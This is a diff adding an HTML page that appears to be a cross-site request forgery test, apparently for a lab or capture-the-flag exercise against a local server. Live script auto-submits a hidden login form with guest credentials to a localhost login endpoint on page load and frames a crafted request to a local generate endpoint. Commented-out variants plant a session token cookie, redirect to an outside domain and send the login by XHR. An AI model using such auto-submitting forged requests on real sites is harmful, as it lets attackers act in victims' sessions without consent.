@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <!-- <form action="http://localhost:3000/login" method="post" id="form">
+        <input type="text" name="name" value="guest">
+        <input type="text" name="password" value="guest">
+        <input type="submit" value="Submit">
+    </form>
+    
+    <script>
+        document.getElementById("form").submit();
+    </script> -->
+
+
+
+    <iframe src="http://127.0.0.1:8000/generate?data=name_guest_value_10_admin_0_admin_1_value_2000" height="1000px" width="1000px"></iframe>
+
+    <form id="yc54616" target="frame" method="post" action="http://127.0.0.1:3000/login">
+        <input type="hidden" name="name" value="guest">
+        <input type="hidden" name="password" value="guest">
+    </form>
+
+    <iframe name="frame" height="600px" width="600px"></iframe>
+
+    <script>
+            var form = document.getElementById("yc54616");
+            form.submit();
+    </script>
+
+    <!-- <meta http-equiv="refresh" content='0; url="http:/yc5.kr"'> -->
+
+    <!-- <FORM name="ifrm" method="POST" target="frm" action="http://localhost:3000/login">
+        <input type="hidden" name="name" value="guest" />
+        <input type="hidden" name="password" value="guest" />
+        <input type="submit" value="Submit" />
+    </FORM> -->
+<!-- 
+    <script>
+        function ready() {
+            document.cookie='session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZ3Vlc3QiLCJpc0xvZ2luIjp0cnVlLCJpYXQiOjE3MzYwNjY3NzZ9.z11_86B1zYJNPwVTXo9HuR_GsEz2y8vBGTrseUoJU54; Max-Age=3600; Path=http://localhost:3000/; Expires=Sun, 05 Jan 2025 09:43:00 GMT; SameSite=None; secure';
+        }
+
+        document.addEventListener("DOMContentLoaded", ready);
+
+        </script>
+    <IFRAME src="http://localhost:3000/" width="1000px" height="1000px" onload="">
+    </IFRAME> -->
+
+
+
+    <!-- <script>
+        x = new XMLHttpRequest();
+        x.onload = function() {document.write(x.responseText);}
+        x.onerror = function() {document.write("Error: " + x.statusText);}
+        x.open("POST", "http://localhost:3000/login", true);
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.send("name=guest&password=guest");
+    </script> -->
+
+</body>
+
+</html>
